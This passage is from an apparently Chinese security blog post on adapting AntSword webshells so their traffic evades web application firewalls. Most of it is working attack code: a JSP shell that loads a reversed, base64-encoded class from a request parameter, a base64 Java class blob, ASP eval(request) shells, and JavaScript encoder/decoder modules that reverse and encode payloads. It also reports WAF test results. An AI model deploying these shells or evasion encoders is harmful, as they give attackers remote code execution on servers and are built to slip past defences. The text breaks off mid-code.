class="line">&lt;%!</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">U</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="title">U</span>(<span class="params">ClassLoader c</span>)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">        public Class <span class="function"><span class="title">g</span>(<span class="params">byte[] b</span>)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public byte[] base64Decode(<span class="built_in">String</span> str) throws Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class clazz = Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> (byte[]) clazz.getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, <span class="built_in">String</span>.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            Class clazz = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            <span class="built_in">Object</span> decoder = clazz.getMethod(<span class="string">&quot;getDecoder&quot;</span>).invoke(<span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">return</span> (byte[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, <span class="built_in">String</span>.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="built_in">String</span> cls = request.getParameter(<span class="string">&quot;passwd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cls != <span class="literal">null</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">String</span> reversedCls = <span class="keyword">new</span> StringBuilder(cls).reverse().toString();</span><br><span class="line">        <span class="built_in">String</span> decodedCls = <span class="keyword">new</span> <span class="built_in">String</span>(base64Decode(reversedCls), <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="keyword">new</span> U(<span class="built_in">this</span>.getClass().getClassLoader()).g(base64Decode(decodedCls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">jsp编码器</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * jsp::base64编码器</span></span><br><span class="line"><span class="comment"> * Create at: 2024/03/04 21:37:02</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @param  &#123;String&#125; pwd   连接密码</span></span><br><span class="line"><span class="comment">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span></span><br><span class="line"><span class="comment">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">pwd, data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">  data[pwd] = Buffer.from(data[<span class="string">&#x27;_&#x27;</span>]).toString(<span class="string">&#x27;base64&#x27;</span>).split(<span class="string">&#x27;&#x27;</span>).reverse().join(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  <span class="comment">// shell 在接收到 payload 后，先处理 pwd 参数下的内容，</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// ##########    请在上方编写你自己的代码   ###################</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 删除 _ 原有的payload</span></span><br><span class="line">  <span class="keyword">delete</span> data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">  <span class="comment">// 返回编码器处理后的 payload 数组</span></span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">jsp解码器</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * JSP::reverse 解码器</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"> &#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> <span class="built_in">module</span>.exports = &#123;</span><br><span class="line">   <span class="attr">asoutput</span>: <span class="function">(<span class="params">ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">      * ext = &#123;</span></span><br><span class="line"><span class="comment">      *   opts: 类型为 Object, Shell 配置</span></span><br><span class="line"><span class="comment">      * &#125;</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">     <span class="keyword">return</span> <span class="string">`yv66vgAAADIAeAoADgA3CgAkADgJACQAOQgAOgoAOwA8CAA9CAA+CgAUAD8IAEAKAAwAQQgAQgcAQwoADABEBwBFCgBGAEcKAA4ASAgASQcASgoAFABLBwBMCABNCgAMAE4KAE8AUAgAUQcAUgcAUwoAGgA3CABUCgAaAFUKABoAVgoAGgBXCgAaAFgIAFkKABQAWggAWwcAXAEAA3JlcwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABjxpbml0PgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAxCYXNlNjRFbmNvZGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEADVN0YWNrTWFwVGFibGUHAEwHAEMHAEUHAFwHAFIBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAKU291cmNlRmlsZQEAE0Fzb3V0cHV0QmFzZTY0LmphdmEMACcAXQwAKwAsDAAlACYBAAxqYXZhLnZlcnNpb24HAF4MAF8ALAEAAAEAAzEuOQwAYABhAQAQamF2YS51dGlsLkJhc2U2NAwAYgBjAQAKZ2V0RW5jb2RlcgEAD2phdmEvbGFuZy9DbGFzcwwAZABlAQAQamF2YS9sYW5nL09iamVjdAcAZgwAZwBoDABpAGoBAA5lbmNvZGVUb1N0cmluZwEAAltCDABrAGwBABBqYXZhL2xhbmcvU3RyaW5nAQAWc3VuLm1pc2MuQkFTRTY0RW5jb2RlcgwAbQBuBwBvDABwAHEBAAZlbmNvZGUBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIBAAx7Im1lc3NhZ2UiOiIMAHIAcwwAJwAoDAB0AHUMADMANAEAClxyXG58XHJ8XG4MAHYAdwEAAiJ9AQASc3JjL0Fzb3V0cHV0QmFzZTY0AQADKClWAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQAJY29tcGFyZVRvAQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAWZ2V0RGVjbGFyZWRDb25zdHJ1Y3RvcgEAMyhbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwEAHWphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yAQALbmV3SW5zdGFuY2UBACcoW0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAdyZXZlcnNlAQAbKClMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAKcmVwbGFjZUFsbAEAOChMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7ACEAJAAOAAAAAQAAACUAJgAAAAMAAQAnACgAAQApAAAALgADAAIAAAAOKrcAASoqK7YAArUAA7EAAAABACoAAAAOAAMAAAAGAAQABwANAAgAAQArACwAAQApAAABGQAGAAYAAACgEgS4AAVNEgZOLBIHtgAImwBLEgm4AAo6BBkEEgsDvQAMtgANGQQDvQAOtgAPOgUZBbYAEBIRBL0ADFkDEwASU7YADRkFBL0ADlkDK7YAE1O2AA/AABROpwBEEhW4AAo6BBkEA70ADLYAFgO9AA62ABc6BRkFtgAQEhgEvQAMWQMTABJTtgANGQUEvQAOWQMrtgATU7YAD8AAFE4tsE4rsAABAAYAnACdABkAAgAqAAAAMgAMAAAACwAGAA4ACQARABIAEgAZABMALwAUAFoAFgBhABcAcwAYAJsAGwCdABwAngAdAC0AAAAnAAP9AFoHAC4HAC79AEAHAC8HADD/AAEAAwcAMQcALgcALgABBwAyAAEAMwA0AAEAKQAAAEgABAABAAAAMLsAGlm3ABsSHLYAHbsAGlkqtAADtwAetgAftgAgEiESBrYAIrYAHRIjtgAdtgAgsAAAAAEAKgAAAAYAAQAAACIAAQA1AAAAAgA2`</span>;</span><br><span class="line">   &#125;,</span><br><span class="line">   <span class="attr">decode_buff</span>: <span class="function">(<span class="params">buff</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">let</span> res = Buffer.from(buff.toString().replace(<span class="regexp">/&#123;&quot;message&quot;:/g</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="regexp">/&quot;&#125;/g</span>,<span class="string">&#x27;&#x27;</span>).split(<span class="string">&#x27;&#x27;</span>).reverse().join(<span class="string">&#x27;&#x27;</span>), <span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="3-waf测试"><a href="#3-waf测试" class="headerlink" title="3.waf测试"></a>3.waf测试</h5><h6 id="3-1waf-雷池"><a href="#3-1waf-雷池" class="headerlink" title="3.1waf 雷池"></a>3.1waf 雷池</h6><p>这里我们不去探究这webshell能不能过waf，为什么？因为这种webshell早就被标记了，想要webshell过waf，肯定需要改一改。<br>而是流量层面能不能过。<br>php已经说到了，雷池只拦截请求包，不检测响应包。<br>先用原版的木马试一下，</p><p><img src="/images/antsword-bypasswaf/image-20240307164817676.png" alt="image-20240307164817676"></p><p>不拦截，那么下面的就不用再试了，肯定也不拦截。</p><p><img src="/images/antsword-bypasswaf/image-20240307165111635.png" alt="image-20240307165111635"></p><h6 id="d盾"><a href="#d盾" class="headerlink" title="d盾"></a>d盾</h6><p>d盾是不管的，这里笔者没有搭建好环境<br>d盾默认是和iis一起使用的，而iis是asp环境，所以这里就不测试了，等asp的时候在进行测试。<br>浅浅查杀一下，不用说<br><img src="/images/antsword-bypasswaf/image-20240307170241885.png" alt="image-20240307170241885"></p><h6 id="安全狗"><a href="#安全狗" class="headerlink" title="安全狗"></a>安全狗</h6><p>安全狗有iis和apache版，没有tomcat版。也不测试了，<br>在测试流量的时候确实是一直报webshell，正常。</p><h4 id="antsword-asp改造"><a href="#antsword-asp改造" class="headerlink" title="antsword-asp改造"></a>antsword-asp改造</h4><h5 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h5><p>asp木马,木马为a</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;% eval(request(&quot;a&quot;))%&gt;</span><br><span class="line">----------------------------</span><br><span class="line">&lt;%</span><br><span class="line">Class LandGrey</span><br><span class="line">  Private Sub class_terminate</span><br><span class="line">    eval    (request(&quot;a&quot;))</span><br><span class="line">  End Sub</span><br><span class="line">End Class</span><br><span class="line"></span><br><span class="line">Set X = New LandGrey</span><br><span class="line">Set X = Nothing</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>这里我们操作一下，先看一下，如果base64要怎么操作<br>根据上面的经验，要在木马里进行base64解码<br>我找了许多网上的方法，并没有找到内置的base64的方法。<br>所以需要自己写一个了。或者网站找一个<br><a href="https://taotaoit.com/article/details/360.html">https://taotaoit.com/article/details/360.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">OPTION EXPLICIT</span><br><span class="line">const BASE_64_MAP_INIT = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br><span class="line">dim newline</span><br><span class="line">dim Base64EncMap(63)</span><br><span class="line">dim Base64DecMap(127)</span><br><span class="line">&#x27;初始化函数</span><br><span class="line">PUBLIC SUB initCodecs()</span><br><span class="line">    &#x27; 初始化变量</span><br><span class="line">    newline = &quot;&lt;P&gt;&quot; &amp; chr(13) &amp; chr(10)</span><br><span class="line">    dim max, idx</span><br><span class="line">    max = len(BASE_64_MAP_INIT)</span><br><span class="line">    for idx = 0 to max - 1</span><br><span class="line">        Base64EncMap(idx) = mid(BASE_64_MAP_INIT, idx + 1, 1)</span><br><span class="line">    next</span><br><span class="line">    for idx = 0 to max - 1</span><br><span class="line">        Base64DecMap(ASC(Base64EncMap(idx))) = idx</span><br><span class="line">    next</span><br><span class="line">END SUB</span><br><span class="line">&#x27;Base64加密函数</span><br><span class="line">PUBLIC FUNCTION base64Encode(plain)</span><br><span class="line">    if len(plain) = 0 then</span><br><span class="line">        base64Encode = &quot;&quot;</span><br><span class="line">        exit function</span><br><span class="line">    end if</span><br><span class="line">    dim ret, ndx, by3, first, second, third</span><br><span class="line">    by3 = (len(plain) \ 3) * 3</span><br><span class="line">    ndx = 1</span><br><span class="line">    do while ndx &lt;= by3</span><br><span class="line">        first = asc(mid(plain, ndx+0, 1))</span><br><span class="line">        second = asc(mid(plain, ndx+1, 1))</span><br><span class="line">        third = asc(mid(plain, ndx+2, 1))</span><br><span class="line">        ret = ret &amp; Base64EncMap( (first \ 4) AND 63 )</span><br><span class="line">        ret = ret &amp; Base64EncMap( ((first * 16) AND 48) + ((second \ 16) AND 15 ) )</span><br><span class="line">        ret = ret &amp; Base64EncMap( ((second * 4) AND 60) + ((third \ 64) AND 3 ) )</span><br><span class="line">        ret = ret &amp; Base64EncMap( third AND 63)</span><br><span class="line">        ndx = ndx + 3</span><br><span class="line">    loop</span><br><span class="line">    if by3 &lt; len(plain) then</span><br><span class="line">        first = asc(mid(plain, ndx+0, 1))</span><br><span class="line">        ret = ret &amp; Base64EncMap( (first \ 4) AND 63 )</span><br><span class="line">        if (len(plain) MOD 3 ) = 2 then</span><br><span class="line">            second = asc(mid(plain, ndx+1, 1))</span><br><span class="line">            ret = ret &amp; Base64EncMap( ((first * 16) AND 48) + ((second \ 16) AND 15 ) )</span><br><span class="line">            ret = ret &amp; Base64EncMap( ((second * 4) AND 60) )</span><br><span class="line">        else</span><br><span class="line">            ret = ret &amp; Base64EncMap( (first * 16) AND 48)</span><br><span class="line">            ret = ret &#x27;&amp; &quot;=&quot;</span><br><span class="line">        end if</span><br><span class="line">        ret = ret &#x27;&amp; &quot;=&quot;</span><br><span class="line">    end if</span><br><span class="line">    base64Encode = ret</span><br><span class="line">END FUNCTION</span><br><span class="line">&#x27;Base64解密函数</span><br><span class="line">PUBLIC FUNCTION base64Decode(scrambled)</span><br><span class="line">    if len(scrambled) = 0 then</span><br><span class="line">        base64Decode = &quot;&quot;</span><br><span class="line">        exit function</span><br><span class="line">    end if</span><br><span class="line">    dim realLen</span><br><span class="line">    realLen = len(scrambled)</span><br><span class="line">    do while mid(scrambled, realLen, 1) = &quot;=&quot;</span><br><span class="line">        realLen = realLen - 1</span><br><span class="line">    loop</span><br><span class="line">    dim ret, ndx, by4, first, second, third, fourth</span><br><span class="line">    ret = &quot;&quot;</span><br><span class="line">    by4 = (realLen \ 4) * 4</span><br><span class="line">    ndx = 1</span><br><span class="line">    do while ndx &lt;= by4</span><br><span class="line">        first = Base64DecMap(asc(mid(scrambled, ndx+0, 1)))</span><br><span class="line">        second = Base64DecMap(asc(mid(scrambled, ndx+1, 1)))</span><br><span class="line">        third = Base64DecMap(asc(mid(scrambled, ndx+2, 1)))</span><br><span class="line">        fourth = Base64DecMap(asc(mid(scrambled, ndx+3, 1)))</span><br><span class="line">        ret = ret &amp; chr( ((first * 4) AND 255) + ((second \ 16) AND 3))</span><br><span class="line">        ret = ret &amp; chr( ((second * 16) AND 255) + ((third \ 4) AND 15))</span><br><span class="line">        ret = ret &amp; chr( ((third * 64) AND 255) + (fourth AND 63))</span><br><span class="line">        ndx = ndx + 4</span><br><span class="line">    loop</span><br><span class="line">    if ndx &lt; realLen then</span><br><span class="line">        first = Base64DecMap(asc(mid(scrambled, ndx+0, 1)))</span><br><span class="line">        second = Base64DecMap(asc(mid(scrambled, ndx+1, 1)))</span><br><span class="line">        ret = ret &amp; chr( ((first * 4) AND 255) + ((second \ 16) AND 3))</span><br><span class="line">        if realLen MOD 4 = 3 then</span><br><span class="line">            third = Base64DecMap(asc(mid(scrambled,ndx+2,1)))</span><br><span class="line">            ret = ret &amp; chr( ((second * 16) AND 255) + ((third \ 4) AND 15))</span><br><span class="line">        end if</span><br><span class="line">    end if</span><br><span class="line">    base64Decode = ret</span><br><span class="line">END FUNCTION</span><br><span class="line"> </span><br><span class="line">&#x27; 初始化</span><br><span class="line">call initCodecs</span><br><span class="line">&#x27; 测试代码</span><br><span class="line">dim inp, encode</span><br><span class="line">inp = &quot;mars20100220&quot;</span><br><span class="line">encode = base64Encode(inp)</span><br><span class="line">&#x27;encode = &quot;bWFyczIwMTAwMjIw0&quot;</span><br><span class="line">response.write &quot;加密前为:&quot; &amp; inp &amp; newline</span><br><span class="line">response.write &quot;加密后为:&quot; &amp; encode &amp; newline</span><br><span class="line">response.write &quot;解密后为:&quot; &amp; base64Decode(encode) &amp; newline</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/antsword-bypasswaf/image-20240402143044552.png" alt="image-20240402143044552"></p><p>那么，我们就需要改一下了。</p><h5 id="asp编码器"><a href="#asp编码器" class="headerlink" title="asp编码器"></a>asp编码器</h5><p>老样子，我们只需要把_所传递的内容编码既可，其中传递的功能参数先不管</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * asp::base64编码器</span></span><br><span class="line"><span class="comment"> * Create at: 2024/03/04 21:37:02</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @param  &#123;String&#125; pwd   连接密码</span></span><br><span class="line"><span class="comment">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span></span><br><span class="line"><span class="comment">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">pwd, data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">  data[pwd] = Buffer.from(data[<span class="string">&#x27;_&#x27;</span>]).toString(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">delete</span> data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">  <span class="comment">// 返回编码器处理后的 payload 数组</span></span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那我们的webshell就需要进行解码了，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">OPTION EXPLICIT</span><br><span class="line">const BASE_64_MAP_INIT = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br><span class="line">dim newline</span><br><span class="line">dim Base64EncMap(63)</span><br><span class="line">dim Base64DecMap(127)</span><br><span class="line">&#x27;初始化函数</span><br><span class="line">PUBLIC SUB initCodecs()</span><br><span class="line">    &#x27; 初始化变量</span><br><span class="line">    newline = &quot;&lt;P&gt;&quot; &amp; chr(13) &amp; chr(10)</span><br><span class="line">    dim max, idx</span><br><span class="line">    max = len(BASE_64_MAP_INIT)</span><br><span class="line">    for idx = 0 to max - 1</span><br><span class="line">        Base64EncMap(idx) = mid(BASE_64_MAP_INIT, idx + 1, 1)</span><br><span class="line">    next</span><br><span class="line">    for idx = 0 to max - 1</span><br><span class="line">        Base64DecMap(ASC(Base64EncMap(idx))) = idx</span><br><span class="line">    next</span><br><span class="line">END SUB</span><br><span class="line">&#x27;Base64解密函数</span><br><span class="line">PUBLIC FUNCTION base64Decode(scrambled)</span><br><span class="line">    if len(scrambled) = 0 then</span><br><span class="line">        base64Decode = &quot;&quot;</span><br><span class="line">        exit function</span><br><span class="line">    end if</span><br><span class="line">    dim realLen</span><br><span class="line">    realLen = len(scrambled)</span><br><span class="line">    do while mid(scrambled, realLen, 1) = &quot;=&quot;</span><br><span class="line">        realLen = realLen - 1</span><br><span class="line">    loop</span><br><span class="line">    dim ret, ndx, by4, first, second, third, fourth</span><br><span class="line">    ret = &quot;&quot;</span><br><span class="line">    by4 = (realLen \ 4) * 4</span><br><span class="line">    ndx = 1</span><br><span class="line">    do while ndx &lt;= by4</span><br><span class="line">        first = Base64DecMap(asc(mid(scrambled, ndx+0, 1)))</span><br><span class="line">        second = Base64DecMap(asc(mid(scrambled, ndx+1, 1)))</span><br><span class="line">        third = Base64DecMap(asc(mid(scrambled, ndx+2, 1)))</span><br><span class="line">        fourth = Base64DecMap(asc(mid(scrambled, ndx+3, 1)))</span><br><span class="line">        ret = ret &amp; chr( ((first * 4) AND 255) + ((second \ 16) AND 3))</span><br><span class="line">        ret = ret &amp; chr( ((second * 16) AND 255) + ((third \ 4) AND 15))</span><br><span class="line">        ret = ret &amp; chr( ((third * 64) AND 255) + (fourth AND 63))</span><br><span class="line">        ndx = ndx + 4</span><br><span class="line">    loop</span><br><span class="line">    if ndx &lt; realLen then</span><br><span class="line">        first = Base64DecMap(asc(mid(scrambled, ndx+0, 1)))</span><br><span class="line">        second = Base64DecMap(asc(mid(scrambled, ndx+1, 1)))</span><br><span class="line">        ret = ret &amp; chr( ((first * 4) AND 255) + ((second \ 16) AND 3))</span><br><span class="line">        if realLen MOD 4 = 3 then</span><br><span class="line">            third = Base64DecMap(asc(mid(scrambled,ndx+2,1)))</span><br><span class="line">            ret = ret &amp; chr( ((second * 16) AND 255) + ((third \ 4) AND 15))</span><br><span class="line">        end if</span><br><span class="line">    end if</span><br><span class="line">    base64Decode = ret</span><br><span class="line">END FUNCTION</span><br><span class="line">&#x27; 初始化</span><br><span class="line">call initCodecs</span><br><span class="line">Dim expression</span><br><span class="line">expression = Request(&quot;a&quot;)</span><br><span class="line">&#x27; Response.Write expression</span><br><span class="line">Dim result</span><br><span class="line">result = eval(base64Decode(expression))</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>上面很简单，就是定义了一个base64解码函数，然后传递了a参数，然后进行base64解码，然后进行eval就可以了。<br><img src="/images/antsword-bypasswaf/image-20240402144243216.png" alt="image-20240402144243216"></p><p>可以看到已经将payloadbase64了。</p><p><img src="/images/antsword-bypasswaf/image-20240402144314008.png" alt="image-20240402144314008"></p><p>下面的功能点还没有操作，后面一起操作。</p><p>这里</p><p><code>Dim expression expression = Request(&quot;a&quot;) &#39; Response.Write expression Dim result result = eval(base64Decode(expression))</code></p><p>这种写法可能会报500错误，好像asp不支持这种函数套函数<br><code>Dim expression expression = Request(&quot;a&quot;) &#39; Response.Write expression Dim result result = base64Decode(expression) Dim resulta resulta = eval(resulta)</code></p><p>这样写就不会报500错误。但是报500错误不影响使用，直接蚁剑连就行</p><p><img src="/images/antsword-bypasswaf/image-20240402145953759.png" alt="image-20240402145953759"></p><p>还是那样，如果waf能解密base64怎么办，我们还是将payload逆序。<br>其实很简单</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 